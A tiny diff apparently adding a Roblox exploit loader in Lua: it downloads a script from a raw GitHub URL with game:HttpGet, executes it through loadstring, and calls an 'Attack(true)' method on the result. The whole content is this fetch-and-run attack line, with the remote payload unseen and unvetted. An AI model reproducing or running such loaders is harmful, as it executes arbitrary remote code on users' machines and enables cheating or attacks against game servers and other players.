@@ -1,1 +1,2 @@
-
+local FastRoyx = loadstring(game:HttpGet("https://raw.githubusercontent.com/SourceFullNightHub/ewihwg/main/Tst"))()
+FastRoyx:Attack(true)
